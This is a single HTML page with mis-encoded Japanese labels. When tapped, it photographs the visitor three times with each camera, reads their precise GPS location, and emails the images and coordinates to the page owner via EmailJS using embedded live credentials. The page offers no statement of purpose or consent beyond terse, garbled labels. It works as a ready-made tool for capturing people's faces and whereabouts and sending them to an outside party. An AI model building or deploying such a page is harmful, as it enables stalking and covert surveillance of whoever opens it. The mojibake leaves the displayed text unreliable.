<!DOCTYPE html>
<html lang="ja">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>ã‚«ãƒ¡ãƒ©ï¼‹ä½ç½®ï¼‹é€ä¿¡</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      margin: 0; padding: 20px;
      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
      color: white;
    }
    .container { max-width: 800px; margin: auto; text-align: center; }
    .touch-area {
      border: 2px dashed rgba(255,255,255,0.3); border-radius: 15px;
      background: rgba(255,255,255,0.1); padding: 40px; margin: 20px 0;
      cursor: pointer;
    }
    .status { background: rgba(0,0,0,0.4); padding: 10px; border-radius: 5px; margin-top: 10px; }
  </style>
  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
  <script defer>
    window.addEventListener('DOMContentLoaded', () => {
      emailjs.init("cPjKBUm_i6HebDQF7");
    });
  </script>
</head>
<body>
<div class="container">
  <h1>ğŸ“· 3é€£å†™ï¼‹ä½ç½®é€ä¿¡</h1>
  <p>å¤–ã‚«ãƒ¡ â†’ å†…ã‚«ãƒ¡ â†’ ä½ç½® â†’ EmailJSé€ä¿¡</p>
  <div class="touch-area" id="touchArea">â–¶ï¸ ã‚¿ãƒƒãƒ—/ã‚¯ãƒªãƒƒã‚¯ã—ã¦å®Ÿè¡Œ</div>
  <div class="status" id="status">å¾…æ©Ÿä¸­</div>
  <video id="cameraVideo" autoplay muted playsinline style="display:none;"></video>
  <canvas id="photoCanvas" style="display:none;"></canvas>
</div>

<script>
const touchArea = document.getElementById('touchArea');
const status = document.getElementById('status');
const video = document.getElementById('cameraVideo');
const canvas = document.getElementById('photoCanvas');
let stream = null;

function updateStatus(msg, color = '') {
  status.textContent = msg;
  status.style.background = color || 'rgba(0,0,0,0.4)';
}

async function capturePhotos(facingMode) {
  updateStatus(`ğŸ“¸ ${facingMode}ã‚«ãƒ¡ãƒ©æ’®å½±ä¸­...`);
  try {
    if (stream) stream.getTracks().forEach(t => t.stop());
    stream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode }, audio: false
    });
    video.srcObject = stream;
    video.style.display = 'block';
    await new Promise(r => setTimeout(r, 1000));

    const ctx = canvas.getContext('2d');
    const photos = [];
   for (let i = 0; i < 3; i++) {
  canvas.width = video.videoWidth || 640;
  canvas.height = video.videoHeight || 480;
  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
  const dataUrl = canvas.toDataURL('image/jpeg', 0.05);  // â† åœ§ç¸®ç‡0.05ã«å¤‰æ›´
  photos.push(dataUrl);
  await new Promise(r => setTimeout(r, 50));
}


    stream.getTracks().forEach(t => t.stop());
    video.style.display = 'none';
    return photos;
  } catch (e) {
    updateStatus("ğŸ“¸ ã‚«ãƒ¡ãƒ©ã‚¨ãƒ©ãƒ¼", "#e57373");
    throw e;
  }
}

async function getLocationInfo() {
  updateStatus("ğŸ“ ä½ç½®æƒ…å ±å–å¾—ä¸­...");
  return new Promise((resolve, reject) => {
    if (!navigator.geolocation) {
      reject(new Error("ä½ç½®æƒ…å ±éå¯¾å¿œ"));
      return;
    }
    navigator.geolocation.getCurrentPosition(
      pos => {
        const loc = {
          lat: pos.coords.latitude,
          lon: pos.coords.longitude,
          acc: pos.coords.accuracy,
          time: new Date(pos.timestamp).toLocaleString()
        };
        resolve(loc);
      },
      err => reject(err),
      { enableHighAccuracy: true, timeout: 10000 }
    );
  });
}

async function sendEmail({ rearPhotos, frontPhotos, location }) {
  updateStatus("âœ‰ï¸ Emailé€ä¿¡ä¸­...", "#29b6f6");
  const templateParams = {
    photo_rear1: rearPhotos[0],
    photo_rear2: rearPhotos[1],
    photo_rear3: rearPhotos[2],
    photo_front1: frontPhotos[0],
    photo_front2: frontPhotos[1],
    photo_front3: frontPhotos[2],
    location_info: `ç·¯åº¦: ${location.lat}<br>çµŒåº¦: ${location.lon}<br>ç²¾åº¦: ${location.acc}m<br>æ™‚åˆ»: ${location.time}`,
    date: new Date().toLocaleString()
  };

  try {
    await emailjs.send('service_ja2c09x', 'template_2fp2jrg', templateParams);
    updateStatus("âœ… ãƒ¡ãƒ¼ãƒ«é€ä¿¡å®Œäº†ï¼", "#66bb6a");
  } catch (e) {
    updateStatus("âŒ ãƒ¡ãƒ¼ãƒ«é€ä¿¡å¤±æ•—", "#f44336");
    throw e;
  }
}

async function runAll() {
  try {
    updateStatus("ğŸ”„ å¤–ã‚«ãƒ¡...");
    const rearPhotos = await capturePhotos("environment");

    updateStatus("ğŸ”„ å†…ã‚«ãƒ¡...");
    const frontPhotos = await capturePhotos("user");

    let location;
    try {
      location = await getLocationInfo();
    } catch (e) {
      location = {
        lat: "å–å¾—å¤±æ•—", lon: "å–å¾—å¤±æ•—", acc: "ä¸æ˜", time: new Date().toLocaleString()
      };
      updateStatus("âš ï¸ ä½ç½®æƒ…å ±å¤±æ•—", "#ff9800");
    }

    await sendEmail({ rearPhotos, frontPhotos, location });
  } catch (e) {
    console.error(e);
    updateStatus("âŒ å…¨ä½“å‡¦ç†ä¸­ã«ã‚¨ãƒ©ãƒ¼", "#f44336");
  }
}

touchArea.addEventListener('click', runAll);
touchArea.addEventListener('touchstart', e => {
  e.preventDefault();
  runAll();
}, { passive: false });
</script>
</body>
</html>
